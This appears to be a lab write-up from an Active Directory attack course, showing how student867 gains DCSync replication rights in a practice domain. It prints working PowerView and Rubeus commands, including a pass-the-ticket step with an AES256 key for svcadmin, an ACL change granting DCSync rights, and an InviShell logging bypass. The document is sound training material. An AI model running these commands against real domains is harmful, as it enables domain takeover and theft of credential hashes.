---
icon: vial
---

# 12 - Learning Object1️2️

## Tasks



1 - Check if student867 has Replication (DCSync) rights

* If yes, execute the DCSync attack to pull hashes of the krbtgt user.
* If no, add the replication rights for student867 and execute the DCSync attack to pull hashes of the krbtgt user.

Flag 21 \[dcorp-dc] - Attack that can be executed with Replication rights (no DA privileges required) 🚩

## Solutions

### 1 - Check if student867 has Replication (DCSync) rights

We can check if student687 has replication rights using the following commands:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Powerview.ps1
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student867"}
```

<figure><img src="../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

#### If no, add the replication rights for student867 and execute the DCSync attack to pull hashes of the krbtgt user.

The student867 doesn't have replication rights, let's add it starting a process as Domain Administrator by running the below command from an elevated command prompt:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<figure><img src="../../.gitbook/assets/image (214).png" alt=""><figcaption></figcaption></figure>

Run the following command in the new process:

```bash
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Powerview.ps1
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student867 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

Go back into the student867 shell to check if all go right:

```powershell
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student867"}
```

<figure><img src="../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

### Flag 21 \[dcorp-dc] - Attack that can be executed with Replication rights (no DA privileges required) 🚩

The DCSync attack can be executed with Replication rights (no DA privileges required).
